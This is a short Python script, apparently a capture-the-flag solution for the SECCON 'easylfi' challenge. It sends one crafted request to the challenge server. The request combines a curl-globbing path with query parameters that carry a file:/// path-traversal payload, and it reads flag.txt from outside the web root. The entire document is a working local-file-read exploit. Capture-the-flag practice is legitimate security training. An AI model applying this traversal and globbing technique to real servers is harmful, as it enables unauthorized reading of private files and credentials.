import requests

s = '''{./flag.txt
--_curl_--file:///app/public/../../flag.txt
SECCON}'''

params = {
    '{': '}{',
    s: 'flag',
}
r = requests.get('http://easylfi.seccon.games:3000/{.}.%2f{\{,.}.%2fflag.txt', params=params)
print(r.text)